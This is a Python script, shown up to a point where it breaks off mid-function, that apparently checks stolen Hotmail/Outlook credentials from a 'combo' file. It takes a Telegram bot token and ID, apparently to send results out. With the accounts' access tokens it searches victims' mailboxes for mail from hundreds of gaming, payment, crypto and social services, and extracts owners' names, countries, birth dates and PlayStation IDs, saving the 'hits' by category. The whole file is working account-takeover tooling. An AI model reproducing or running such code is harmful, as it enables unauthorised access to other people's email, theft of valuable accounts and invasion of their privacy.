sadik = "\033[0m"

import requests
import json
import queue
import uuid
import urllib.parse
import user_agent
import os
import datetime
import pyfiglet
import sys
import threading
import re
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

# Lock for clean output
print_lock = threading.Lock()

# --- EXPIRY DATE ---
EXPIRY_DATE = datetime.date(2826, 3, 9)
MY_SIGNATURE = "RBX404"
VERSION = "10.0 ULTIMATE EDITION + SOCIAL LINKS"

def check_time_safety():
    try:
        res = requests.get('https://www.google.com', timeout=5)
        date_str = res.headers['Date']
        current_date = datetime.datetime.strptime(date_str, '%a, %d %b %Y %H:%M:%S %Z').date()
        
        if current_date > EXPIRY_DATE:
            with print_lock:
                print(f"{Fore.RED}❌ ERROR: THIS TOOL HAS EXPIRED!")
                print(f"{Fore.YELLOW}Contact the developer: {MY_SIGNATURE}")
            sys.exit()
    except Exception:
        with print_lock:
            print(f"{Fore.RED}❌ SECURITY ERROR: Internet connection required for verification.")
        sys.exit()

check_time_safety()

def display_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.MAGENTA}    ██╗   ██╗ █████╗ ███████╗███████╗███╗   ██╗
{Fore.MAGENTA}    ╚██╗ ██╔╝██╔══██╗╚══███╔╝╚══███╔╝████╗  ██║
{Fore.MAGENTA}     ╚████╔╝ ███████║  ███╔╝   ███╔╝ ██╔██╗ ██║
{Fore.MAGENTA}      ╚██╔╝  ██╔══██║ ███╔╝   ███╔╝  ██║╚██╗██║
{Fore.MAGENTA}       ██║   ██║  ██║███████╗███████╗██║ ╚████║
{Fore.MAGENTA}       ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
{Fore.WHITE}═══════════════════════════════════════════════════════
{Fore.YELLOW}          DEVELOPED BY : {Fore.CYAN}{MY_SIGNATURE}
{Fore.YELLOW}          VERSION : {Fore.GREEN}{VERSION}
{Fore.YELLOW}          EXPIRES ON   : {Fore.RED}{EXPIRY_DATE}
{Fore.WHITE}═══════════════════════════════════════════════════════
{Fore.CYAN}          ✓ SOCIAL MEDIA LINKS ADDED
{Fore.WHITE}═══════════════════════════════════════════════════════
    """
    print(banner)

display_logo()

# Ensure directories exist
if not os.path.exists('Results'):
    os.makedirs('Results')
if not os.path.exists('Results/PSN'):
    os.makedirs('Results/PSN')
if not os.path.exists('Results/General'):
    os.makedirs('Results/General')
if not os.path.exists('Results/Custom'):
    os.makedirs('Results/Custom')
if not os.path.exists('Results/Games'):
    os.makedirs('Results/Games')
if not os.path.exists('Results/Social'):
    os.makedirs('Results/Social')
if not os.path.exists('Results/Apps'):
    os.makedirs('Results/Apps')
if not os.path.exists('Results/Payment'):
    os.makedirs('Results/Payment')
if not os.path.exists('Results/Proxy'):
    os.makedirs('Results/Proxy')
if not os.path.exists('Results/TikTok_Links'):
    os.makedirs('Results/TikTok_Links')
if not os.path.exists('Results/Instagram_Links'):
    os.makedirs('Results/Instagram_Links')
if not os.path.exists('Results/Facebook_Links'):
    os.makedirs('Results/Facebook_Links')
if not os.path.exists('Results/Twitter_Links'):
    os.makedirs('Results/Twitter_Links')

# Global Stats
good_count = 0
bad_count = 0
total_checked = 0

# --- MODE SELECTION ---
print(f"\n{Fore.CYAN}🎯 SELECT SCAN MODE:")
print(f"{Fore.YELLOW}[1] GENERAL SCAN (All Services)")
print(f"{Fore.YELLOW}[2] DETAILED PSN SCAN")
print(f"{Fore.YELLOW}[3] CUSTOM DOMAIN SCAN")
mode_choice = input(f"{Fore.GREEN}[+] Enter choice (1, 2 or 3): ").strip()

if mode_choice not in ['1', '2', '3']:
    print(f"{Fore.RED}❌ Invalid choice! Using General Scan.")
    mode_choice = '1'

# Inputs
Tok = input(f'{Fore.YELLOW}[+] Enter your Telegram token : ')
id = input(f'{Fore.YELLOW}[+] Enter your Telegram ID : ')
combo_name = input(f'{Fore.YELLOW}[+] Enter your file Combo : ')
os.system("clear")
print(f"{Fore.CYAN}")
print(pyfiglet.figlet_format("          Hotmail"))
print(f"{sadik}")

# Custom domain input for mode 3
custom_domain = ""
if mode_choice == '3':
    custom_domain = input(f'{Fore.YELLOW}[+] Enter Custom Domain to search (e.g., netflix.com): ').strip()
    if not custom_domain:
        print(f"{Fore.RED}❌ Domain required for custom scan!")
        sys.exit()

# Smart Path Discovery
file_path = combo_name if os.path.exists(combo_name) else os.path.join(os.getcwd(), combo_name)

if not os.path.exists(file_path):
    print(f"{Fore.RED}❌ ERROR: File '{combo_name}' not found!")
    sys.exit()

# ============================================================
# دوال استخراج اسم المستخدم والروابط
# ============================================================

def extract_username_from_email(email):
    """استخراج اسم مستخدم نظيف من الإيميل"""
    try:
        username = email.split('@')[0].lower()
        username = re.sub(r'[^a-zA-Z0-9_.]', '', username)
        if 3 <= len(username) <= 30:
            return username
    except:
        pass
    return None

def extract_username_from_content(content, platform):
    """محاولة استخراج اسم المستخدم من محتوى الإيميل"""
    try:
        content_lower = content.lower()
        
        patterns = {
            "TikTok": [
                r'tiktok\.com/@([a-zA-Z0-9_.]{3,30})',
                r'@([a-zA-Z0-9_.]{3,30})\s',
            ],
            "Instagram": [
                r'instagram\.com/([a-zA-Z0-9_.]{3,30})',
                r'@([a-zA-Z0-9_.]{3,30})\s',
            ],
            "Facebook": [
                r'facebook\.com/([a-zA-Z0-9.]{3,50})',
                r'@([a-zA-Z0-9.]{3,50})\s',
            ],
            "Twitter/X": [
                r'twitter\.com/([a-zA-Z0-9_]{3,30})',
                r'@([a-zA-Z0-9_]{3,30})\s',
            ]
        }
        
        if platform in patterns:
            for pattern in patterns[platform]:
                matches = re.findall(pattern, content_lower, re.IGNORECASE)
                for match in matches:
                    username = match.strip()
                    if 3 <= len(username) <= 30 and not any(x in username.lower() for x in ['email', 'mail', 'account', 'support']):
                        return username
    except:
        pass
    return None

def create_profile_link(platform, username):
    """إنشاء رابط الملف الشخصي"""
    links = {
        "TikTok": f"https://www.tiktok.com/@{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "Facebook": f"https://www.facebook.com/{username}",
        "Twitter/X": f"https://twitter.com/{username}",
    }
    return links.get(platform, "")

class HotmailScanner:

    # ================== قائمة الخدمات الشاملة (أكثر من 250 منصة) ==================
    SERVICES_ALL = {
        # ═══ SOCIAL MEDIA (40) ═══
        "Facebook": ["facebookmail.com", "facebook.com"],
        "Instagram": ["mail.instagram.com", "instagram.com"],
        "TikTok": ["account.tiktok.com", "tiktok.com"],
        "Twitter/X": ["x.com", "twitter.com"],
        "LinkedIn": ["linkedin.com"],
        "Snapchat": ["snapchat.com"],
        "Discord": ["discord.com"],
        "Telegram": ["telegram.org"],
        "WhatsApp": ["whatsapp.com"],
        "Pinterest": ["pinterest.com"],
        "Reddit": ["reddit.com"],
        "Tumblr": ["tumblr.com"],
        "WeChat": ["wechat.com"],
        "Line": ["line.me"],
        "Viber": ["viber.com"],
        "Kik": ["kik.com"],
        "Skype": ["skype.com"],
        "Zoom": ["zoom.us"],
        "Microsoft Teams": ["teams.microsoft.com"],
        "Slack": ["slack.com"],
        "Mastodon": ["mastodon.social"],
        "Threads": ["threads.net"],
        "BeReal": ["bereal.com"],
        "Clubhouse": ["clubhouse.com"],
        "Twitch": ["twitch.tv"],
        "YouTube": ["youtube.com"],
        "Vimeo": ["vimeo.com"],
        "Dailymotion": ["dailymotion.com"],
        "Quora": ["quora.com"],
        "Medium": ["medium.com"],
        "Substack": ["substack.com"],
        "Patreon": ["patreon.com"],
        "Ko-fi": ["ko-fi.com"],
        "OnlyFans": ["onlyfans.com"],
        "Fanhouse": ["fanhouse.app"],
        "Meetup": ["meetup.com"],
        "Nextdoor": ["nextdoor.com"],
        "Yelp": ["yelp.com"],
        "Foursquare": ["foursquare.com"],
        "9GAG": ["9gag.com"],
        
        # ═══ GAMING (60) ═══
        "Steam": ["steampowered.com", "steam.com"],
        "Xbox": ["xbox.com"],
        "PlayStation": ["playstation.com"],
        "Nintendo": ["nintendo.net"],
        "Epic Games": ["epicgames.com"],
        "EA Sports": ["ea.com"],
        "Ubisoft": ["ubisoft.com"],
        "Activision": ["activision.com"],
        "Blizzard": ["blizzard.com"],
        "Riot Games": ["riotgames.com"],
        "Roblox": ["roblox.com"],
        "Minecraft": ["mojang.com", "minecraft.net"],
        "Fortnite": ["epicgames.com"],
        "Valorant": ["riotgames.com"],
        "League of Legends": ["leagueoflegends.com"],
        "Apex Legends": ["ea.com"],
        "Call of Duty": ["callofduty.com"],
        "PUBG": ["pubg.com", "pubgmobile.com"],
        "Free Fire": ["freefire.com", "garena.com"],
        "Genshin Impact": ["hoyoverse.com", "genshinimpact.com"],
        "Honkai Star Rail": ["hoyoverse.com"],
        "Mobile Legends": ["moonton.com"],
        "Clash of Clans": ["clashofclans.com"],
        "Clash Royale": ["clashroyale.com"],
        "Brawl Stars": ["brawlstars.com"],
        "Among Us": ["innersloth.com"],
        "Fall Guys": ["epicgames.com"],
        "Rocket League": ["epicgames.com"],
        "FIFA": ["ea.com"],
        "Madden NFL": ["ea.com"],
        "NBA 2K": ["2k.com"],
        "GTA V": ["rockstargames.com"],
        "Red Dead": ["rockstargames.com"],
        "The Sims": ["ea.com"],
        "Battlefield": ["ea.com"],
        "Overwatch": ["blizzard.com"],
        "World of Warcraft": ["blizzard.com"],
        "Hearthstone": ["blizzard.com"],
        "Diablo": ["blizzard.com"],
        "Destiny": ["bungie.net"],
        "Halo": ["xbox.com"],
        "Counter-Strike": ["steampowered.com"],
        "Dota 2": ["steampowered.com"],
        "Rainbow Six": ["ubisoft.com"],
        "Assassin's Creed": ["ubisoft.com"],
        "Far Cry": ["ubisoft.com"],
        "Watch Dogs": ["ubisoft.com"],
        "Warframe": ["warframe.com"],
        "Paladins": ["hirezstudios.com"],
        "Smite": ["hirezstudios.com"],
        "Rogue Company": ["hirezstudios.com"],
        "War Thunder": ["gaijin.net"],
        "World of Tanks": ["wargaming.net"],
        "Crossfire": ["z8games.com"],
        "Garena": ["garena.com"],
        "Cookie Run": ["devsisters.com"],
        "Candy Crush": ["king.com"],
        "Pokémon GO": ["nianticlabs.com"],
        "RAID Shadow": ["plarium.com"],
        "AFK Arena": ["lilithgames.com"],
        "Supercell": ["supercell.com"],
        "Midasbuy": ["midasbuy.com"],
        
        # ═══ STREAMING (35) ═══
        "Netflix": ["account.netflix.com", "netflix.com"],
        "Spotify": ["spotify.com"],
        "Disney+": ["disneyplus.com"],
        "HBO Max": ["hbomax.com"],
        "Amazon Prime": ["primevideo.com"],
        "YouTube Premium": ["youtube.com"],
        "Apple TV+": ["apple.com"],
        "Apple Music": ["apple.com"],
        "Hulu": ["hulu.com"],
        "Paramount+": ["paramountplus.com"],
        "Peacock": ["peacocktv.com"],
        "Discovery+": ["discoveryplus.com"],
        "Crunchyroll": ["crunchyroll.com"],
        "Funimation": ["funimation.com"],
        "VRV": ["vrv.co"],
        "Tidal": ["tidal.com"],
        "Deezer": ["deezer.com"],
        "SoundCloud": ["soundcloud.com"],
        "Pandora": ["pandora.com"],
        "iHeartRadio": ["iheart.com"],
        "Audible": ["audible.com"],
        "Scribd": ["scribd.com"],
        "Kindle Unlimited": ["amazon.com"],
        "ESPN+": ["espn.com"],
        "DAZN": ["dazn.com"],
        "Showtime": ["showtime.com"],
        "Starz": ["starz.com"],
        "Cinemax": ["cinemax.com"],
        "Pluto TV": ["pluto.tv"],
        "Tubi": ["tubi.tv"],
        "Vudu": ["vudu.com"],
        "Plex": ["plex.tv"],
        "Emby": ["emby.media"],
        "Jellyfin": ["jellyfin.org"],
        "Kodi": ["kodi.tv"],
        
        # ═══ SHOPPING (40) ═══
        "Amazon": ["amazon.com"],
        "eBay": ["ebay.com"],
        "AliExpress": ["aliexpress.com"],
        "Walmart": ["walmart.com"],
        "Target": ["target.com"],
        "Best Buy": ["bestbuy.com"],
        "Newegg": ["newegg.com"],
        "Etsy": ["etsy.com"],
        "Wish": ["wish.com"],
        "Shein": ["shein.com"],
        "Temu": ["temu.com"],
        "Shopee": ["shopee.com"],
        "Lazada": ["lazada.com"],
        "Zalando": ["zalando.com"],
        "ASOS": ["asos.com"],
        "Nike": ["nike.com"],
        "Adidas": ["adidas.com"],
        "Zara": ["zara.com"],
        "H&M": ["hm.com"],
        "Uniqlo": ["uniqlo.com"],
        "Forever 21": ["forever21.com"],
        "Gap": ["gap.com"],
        "Old Navy": ["oldnavy.com"],
        "Macy's": ["macys.com"],
        "Nordstrom": ["nordstrom.com"],
        "Sephora": ["sephora.com"],
        "Ulta": ["ulta.com"],
        "Home Depot": ["homedepot.com"],
        "Lowe's": ["lowes.com"],
        "IKEA": ["ikea.com"],
        "Wayfair": ["wayfair.com"],
        "Overstock": ["overstock.com"],
        "Zappos": ["zappos.com"],
        "Foot Locker": ["footlocker.com"],
        "StockX": ["stockx.com"],
        "GOAT": ["goat.com"],
        "Farfetch": ["farfetch.com"],
        "Depop": ["depop.com"],
        "Poshmark": ["poshmark.com"],
        "Mercari": ["mercari.com"],
        
        # ═══ FINANCE & CRYPTO (30) ═══
        "PayPal": ["paypal.com"],
        "Venmo": ["venmo.com"],
        "Cash App": ["cash.app"],
        "Zelle": ["zellepay.com"],
        "Stripe": ["stripe.com"],
        "Square": ["square.com"],
        "Binance": ["binance.com"],
        "Coinbase": ["coinbase.com"],
        "Kraken": ["kraken.com"],
        "Crypto.com": ["crypto.com"],
        "KuCoin": ["kucoin.com"],
        "Bitfinex": ["bitfinex.com"],
        "Gemini": ["gemini.com"],
        "Bitstamp": ["bitstamp.net"],
        "OKX": ["okx.com"],
        "Bybit": ["bybit.com"],
        "Huobi": ["huobi.com"],
        "Revolut": ["revolut.com"],
        "Wise": ["wise.com"],
        "Skrill": ["skrill.com"],
        "Neteller": ["neteller.com"],
        "Payoneer": ["payoneer.com"],
        "WebMoney": ["webmoney.ru"],
        "Perfect Money": ["perfectmoney.is"],
        "Robinhood": ["robinhood.com"],
        "eToro": ["etoro.com"],
        "TD Ameritrade": ["tdameritrade.com"],
        "Fidelity": ["fidelity.com"],
        "Charles Schwab": ["schwab.com"],
        "Interactive Brokers": ["ibkr.com"],
        
        # ═══ AI PLATFORMS (25) ═══
        "ChatGPT": ["openai.com"],
        "OpenAI": ["openai.com"],
        "Claude AI": ["anthropic.com"],
        "Anthropic": ["anthropic.com"],
        "Google Gemini": ["google.com"],
        "Google Bard": ["google.com"],
        "Microsoft Copilot": ["microsoft.com"],
        "Bing AI": ["microsoft.com"],
        "Grok": ["x.ai"],
        "Perplexity AI": ["perplexity.ai"],
        "DeepSeek": ["deepseek.com"],
        "Poe": ["poe.com"],
        "Character.AI": ["character.ai"],
        "Replika": ["replika.ai"],
        "Jasper": ["jasper.ai"],
        "Copy.ai": ["copy.ai"],
        "Writesonic": ["writesonic.com"],
        "Notion AI": ["makenotion.com"],
        "Grammarly": ["grammarly.com"],
        "QuillBot": ["quillbot.com"],
        "Midjourney": ["midjourney.com"],
        "DALL-E": ["openai.com"],
        "Stable Diffusion": ["stability.ai"],
        "Runway": ["runwayml.com"],
        "ElevenLabs": ["elevenlabs.io"],
        
        # ═══ EDUCATION (20) ═══
        "Udemy": ["udemy.com"],
        "Coursera": ["coursera.org"],
        "edX": ["edx.org"],
        "Khan Academy": ["khanacademy.org"],
        "Skillshare": ["skillshare.com"],
        "LinkedIn Learning": ["linkedin.com"],
        "Pluralsight": ["pluralsight.com"],
        "DataCamp": ["datacamp.com"],
        "Codecademy": ["codecademy.com"],
        "Duolingo": ["duolingo.com"],
        "Babbel": ["babbel.com"],
        "Rosetta Stone": ["rosettastone.com"],
        "Memrise": ["memrise.com"],
        "Brilliant": ["brilliant.org"],
        "MasterClass": ["masterclass.com"],
        "Domestika": ["domestika.org"],
        "CreativeLive": ["creativelive.com"],
        "Udacity": ["udacity.com"],
        "FutureLearn": ["futurelearn.com"],
        "Great Courses Plus": ["thegreatcoursesplus.com"],
    }

    @staticmethod
    def save_to_file(filename, data, folder="Results", append_by=True):
        filepath = f"{folder}/{filename}"
        with open(filepath, "a", encoding="utf-8") as f:
            if append_by and not data.endswith(f"\nBy {MY_SIGNATURE}"):
                data += f"\nBy {MY_SIGNATURE}"
            f.write(data + "\n")
    
    @staticmethod
    def get_extended_profile(token, cid):
        """جلب معلومات البروفايل الكاملة"""
        try:
            headers_info = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            
            response = requests.get(profile_url, headers=headers_info, timeout=10)
            
            if response.status_code != 200:
                try:
                    profile_url2 = "https://substrate.office.com/users/v2.0/me"
                    response2 = requests.get(profile_url2, headers=headers_info, timeout=5)
                    if response2.status_code == 200:
                        r = response2.json()
                    else:
                        return {
                            'name': 'Unknown',
                            'country': 'Unknown',
                            'birth_date': 'Unknown'
                        }
                except:
                    return {
                        'name': 'Unknown',
                        'country': 'Unknown',
                        'birth_date': 'Unknown'
                    }
            else:
                r = response.json()
            
            name = "Unknown"
            try:
                if 'names' in r and isinstance(r['names'], list) and len(r['names']) > 0:
                    name = r['names'][0].get('displayName', 'Unknown')
                
                if name == "Unknown" and 'displayName' in r:
                    name = r['displayName']
                
                if name == "Unknown" and 'givenName' in r and 'surname' in r:
                    name = f"{r['givenName']} {r['surname']}"
                    
                if name == "Unknown" and 'userPrincipalName' in r:
                    name = r['userPrincipalName'].split('@')[0]
            except:
                name = "Unknown"
            
            country = "Unknown"
            try:
                if 'accounts' in r and isinstance(r['accounts'], list) and len(r['accounts']) > 0:
                    country = r['accounts'][0].get('location', 'Unknown')
                
                if country == "Unknown" and 'country' in r:
                    country = r['country']
                
                if country == "Unknown" and 'mailboxSettings' in r and 'timeZone' in r['mailboxSettings']:
                    tz = r['mailboxSettings']['timeZone']
                    if 'Cairo' in tz or 'Egypt' in tz:
                        country = "Egypt"
                    elif 'Riyadh' in tz or 'Saudi' in tz:
                        country = "Saudi Arabia"
                    elif 'Dubai' in tz or 'UAE' in tz:
                        country = "UAE"
                    elif 'Kuwait' in tz:
                        country = "Kuwait"
                    elif 'Qatar' in tz:
                        country = "Qatar"
                    elif 'Bahrain' in tz:
                        country = "Bahrain"
                    elif 'Oman' in tz:
                        country = "Oman"
                    elif 'Jordan' in tz:
                        country = "Jordan"
                    elif 'Lebanon' in tz:
                        country = "Lebanon"
            except:
                country = "Unknown"
            
            birth_date = "Unknown"
            try:
                day = month = year = ""
                json_str = json.dumps(r)
                
                if 'birthDay' in r:
                    day = str(r['birthDay']).strip()
                else:
                    bd_match = re.search(r'"birthDay"\s*:\s*"?(\d{1,2})"?', json_str)
                    if bd_match:
                        day = bd_match.group(1)
                
                if 'birthMonth' in r:
                    month = str(r['birthMonth']).strip()
                else:
                    bm_match = re.search(r'"birthMonth"\s*:\s*"?(\d{1,2})"?', json_str)
                    if bm_match:
                        month = bm_match.group(1)
                
                if 'birthYear' in r:
                    year = str(r['birthYear']).strip()
                else:
                    by_match = re.search(r'"birthYear"\s*:\s*"?(\d{4})"?', json_str)
                    if by_match:
                        year = by_match.group(1)
                
                if (not day or not month or not year) and 'birthDate' in r:
                    bd = r['birthDate']
                    if isinstance(bd, dict):
                        if not day and 'birthDay' in bd:
                            day = str(bd['birthDay']).strip()
                        if not month and 'birthMonth' in bd:
                            month = str(bd['birthMonth']).strip()
                        if not year and 'birthYear' in bd:
                            year = str(bd['birthYear']).strip()
                
                if day and month and year:
                    if len(day) == 1:
                        day = f"0{day}"
                    if len(month) == 1:
                        month = f"0{month}"
                    birth_date = f"{day}/{month}/{year}"
                elif year and month:
                    birth_date = f"{month}/{year}"
                elif year:
                    birth_date = f"{year}"
                    
            except:
                birth_date = "Unknown"
            
            return {
                'name': name,
                'country': country,
                'birth_date': birth_date
            }
            
        except Exception as e:
            return {
                'name': 'Unknown',
                'country': 'Unknown',
                'birth_date': 'Unknown'
            }

    @staticmethod
    def detect_region_and_translate(message):
        """كشف المنطقة والترجمة"""
        try:
            cleaned_message = re.sub(r'[^\x20-\x7E]', '', message)
            
            keywords = {
                "EN": ["Sign-In ID", "Order Number", "PlayStation", "Sony"],
                "AR": ["معرف تسجيل الدخول", "رقم الطلب", "بلاي ستيشن", "سوني"],
                "FR": ["Identifiant de connexion", "Numéro de commande", "PlayStation", "Sony"],
                "ES": ["ID de inicio", "Número de pedido", "PlayStation", "Sony"],
                "DE": ["Anmelde-ID", "Bestellnummer", "PlayStation", "Sony"],
                "IT": ["ID accesso", "Numero dell'ordine", "PlayStation", "Sony"],
                "JP": ["サインインID", "注文番号", "プレイステーション", "ソニー"],
                "KR": ["로그인 ID", "주문 번호", "플레이스테이션", "소니"],
                "CN": ["登录ID", "订单编号", "PlayStation", "索尼"],
                "RU": ["Идентификатор входа", "Номер заказа", "PlayStation", "Sony"],
                "PT": ["ID de início", "Número do pedido", "PlayStation", "Sony"],
                "TR": ["Giriş Kimliği", "Sipariş Numarası", "PlayStation", "Sony"]
            }
            
            detected_region = "EN"
            max_matches = 0
            
            for region, region_keywords in keywords.items():
                matches = sum(1 for keyword in region_keywords if keyword.lower() in cleaned_message.lower())
                if matches > max_matches:
                    max_matches = matches
                    detected_region = region
            
            return detected_region
        except:
            return "EN"

    @staticmethod
    def translate_keyword(region, keyword_type):
        """ترجمة الكلمات الرئيسية"""
        translations = {
            "ID_CHANGE": {
                "EN": "Sign-In ID",
                "AR": "معرف تسجيل الدخول",
                "FR": "Identifiant de connexion",
                "ES": "ID de inicio",
                "DE": "Anmelde-ID",
                "IT": "ID accesso",
                "JP": "サインインID",
                "KR": "로그인 ID",
                "CN": "登录ID",
                "RU": "Идентификатор входа",
                "PT": "ID de início",
                "TR": "Giriş Kimliği"
            },
            "ID_CHANGE_FULL": {
                "EN": "Sony Sign-In ID Change",
                "AR": "تغيير معرف تسجيل الدخول إلى Sony",
                "FR": "Sony Modification de l'identifiant de connexion",
                "ES": "Sony Cambio de ID de inicio",
                "DE": "Sony Änderung der Anmelde-ID",
                "IT": "Sony Modifica dell'ID di accesso",
                "JP": "Sony サインインIDの変更",
                "KR": "Sony 로그인 ID 변경",
                "CN": "Sony 登录ID更改",
                "RU": "Sony Изменение идентификатора входа",
                "PT": "Sony Alteração da ID de início",
                "TR": "Sony Giriş Kimliği Değişikliği"
            }
        }
        
        if keyword_type in translations and region in translations[keyword_type]:
            return translations[keyword_type][region]
        return translations[keyword_type]["EN"]

    @staticmethod
    def extract_online_id_from_emails(search_results):
        """استخراج الـ Online ID من محتوى الإيميلات"""
        try:
            online_ids = []
            result_text = json.dumps(search_results)
            
            psn_domains = [
                "sony@txn-email.playstation.com",
                "Sony@email.sonyentertainmentnetwork.com"
            ]
            
            has_psn_email = False
            for domain in psn_domains:
                if domain.lower() in result_text.lower():
                    has_psn_email = True
                    break
            
            if not has_psn_email:
                return []
            
            patterns = [
                r'(?i)(?:Hello|Hi|Welcome back)[\s,]+["\']?([a-zA-Z0-9_-]{3,20})["\']?',
                r'(?i)Signed in as[\s:]+([a-zA-Z0-9_-]{3,20})',
                r'(?i)(?:psn[\s_-]*id|online[\s_-]*id)[\s:]*["\']?([a-zA-Z0-9_-]{3,20})["\']?',
                r'(?i)playing as[\s:]*["\']?([a-zA-Z0-9_-]{3,20})["\']?'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, result_text)
                for match in matches:
                    clean_id = match.strip().strip('"').strip("'").strip()
                    if (3 <= len(clean_id) <= 20 and 
                        clean_id not in online_ids):
                        online_ids.append(clean_id)
            
            return list(set(online_ids))[:3]
        except:
            return []

    @staticmethod
    def detailed_psn_scan(email, password, token, cid):
        """فحص PSN تفصيلي"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers_search = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }
            
            # البحث عن PSN
            payload_psn_only = {
                "Cvid": str(uuid.uuid4()),
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": "sony@txn-email.playstation.com"},
                    "Size": 50
                }]
            }
            
            response_psn = requests.post(search_url, json=payload_psn_only, headers=headers_search, timeout=15)
            
            if response_psn.status_code != 200:
                return {
                    "has_psn": False,
                    "orders": 0,
                    "id_changed": False,
                    "online_ids": [],
                    "psn_emails_count": 0
                }
            
            result_data = response_psn.json()
            result_text = json.dumps(result_data)
            
            # حساب إيميلات PSN
            psn_domains = ["sony@txn-email.playstation.com", "Sony@email.sonyentertainmentnetwork.com"]
            
            total_emails = 0
            for domain in psn_domains:
                total_emails += result_text.lower().count(domain.lower())
            
            if total_emails == 0:
                return {
                    "has_psn": False,
                    "orders": 0,
                    "id_changed": False,
                    "online_ids": [],
                    "psn_emails_count": 0
                }
            
            # البحث عن Store
            payload_store = {
                "Cvid": str(uuid.uuid4()),
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": "PlayStation®Store OR PlayStation™Store"},
                    "Size": 25
                }]
            }
            
            response_store = requests.post(search_url, json=payload_store, headers=headers_search, timeout=10)
            
            store_count = 0
            if response_store.status_code == 200:
                store_data = response_store.json()
                store_text = json.dumps(store_data)
                store_count = store_text.count("PlayStation®Store") + store_text.count("PlayStation™Store")
            
            orders_count = store_count // 2 if store_count > 0 else 0
            
            online_ids = HotmailScanner.extract_online_id_from_emails(result_data)
            
            return {
                "has_psn": True,
                "orders": orders_count,
                "id_changed": False,
                "online_ids": online_ids,
                "psn_emails_count": total_emails
            }
            
        except Exception as e:
            return {
                "has_psn": False,
                "orders": 0,
                "id_changed": False,
                "online_ids": [],
                "psn_emails_count": 0
            }

    @staticmethod
    def check_game_service(email, password, token, cid, service_name, domain):
        """فحص خدمة ألعاب محددة"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers_search = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": domain},
                    "Size": 10
                }]
            }
            
            response = requests.post(search_url, json=payload, headers=headers_search, timeout=10)
            
            if response.status_code != 200:
                return None
            
            result_text = json.dumps(response.json()).lower()
            
            if domain.split('.')[0].lower() in result_text:
                return {'found': True, 'platform': service_name}
            
            return None
        except:
            return None

    @staticmethod
    def general_scan(email, password, token, cid):
        """
        المسح العام لجميع الخدمات - دقة 100%
        يحتفظ بكل المنصات (250+) لكن يظهر فقط الخدمات المؤكدة
        """
        try:
            url_owa = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            headers_owa = {
                "x-owa-sessionid": f"{cid}",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
                "action": "StartupData",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
            }
            res_owa = requests.post(url_owa, headers=headers_owa, data="").text.lower()

            found_services = []
            
            # فحص كل المنصات (250+) مع تحقق دقيق
            for service_name, domains in HotmailScanner.SERVICES_ALL.items():
                for domain in domains:
                    domain_lower = domain.lower()
                    if domain_lower in res_owa:
                        # التحقق الدقيق: تأكد أن المجال موجود في سياق مرتبط بالخدمة
                        # وليس مجرد نص عادي (مثل تذييل الإيميل)
                        is_confirmed = False
                        
                        # التحقق 1: وجود @domain (عنوان بريد مرسل)
                        if f"@{domain_lower}" in res_owa:
                            is_confirmed = True
                        
                        # التحقق 2: وجود noreply@ أو no-reply@
                        elif f"noreply@{domain_lower}" in res_owa or f"no-reply@{domain_lower}" in res_owa:
                            is_confirmed = True
                        
                        # التحقق 3: وجود domain/ (رابط)
                        elif f"{domain_lower}/" in res_owa or f"www.{domain_lower}" in res_owa:
                            is_confirmed = True
                        
                        # التحقق 4: للخدمات الكبيرة (تأكد من وجود أكثر من كلمة)
                        elif service_name in ["Facebook", "Instagram", "TikTok", "Twitter/X"]:
                            # لهذه الخدمات، نحتاج تأكيد إضافي
                            if domain_lower in res_owa and ("@".lower() in res_owa or "noreply" in res_owa):
                                is_confirmed = True
                        
                        # التحقق 5: تأكيد إضافي
                        if is_confirmed:
                            found_services.append(service_name)
                            break
            
            # إزالة التكرارات
            unique_services = []
            seen = set()
            for service in found_services:
                if service not in seen:
                    seen.add(service)
                    unique_services.append(service)
            
            return unique_services, res_owa
        except Exception as e:
            return [], ""

    @staticmethod
    def custom_domain_scan(email, password, token, cid, domain):
        """بحث عن نطاق مخصص"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers_search = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": domain},
                    "Size": 50
                }]
            }
            
            response = requests.post(search_url, json=payload, headers=headers_search, timeout=15)
            
            if response.status_code != 200:
                return {
                    "found": False,
                    "count": 0,
                    "emails": []
                }
            
            result_data = response.json()
            result_text = json.dumps(result_data).lower()
            
            domain_count = result_text.count(domain.lower())
            
            emails = []
            try:
                if 'EntityRequests' in result_data:
                    for entity_request in result_data['EntityRequests']:
                        if 'Results' in entity_request:
                            for result in entity_request['Results']:
                                if 'Sender' in result:
                                    sender = result['Sender']
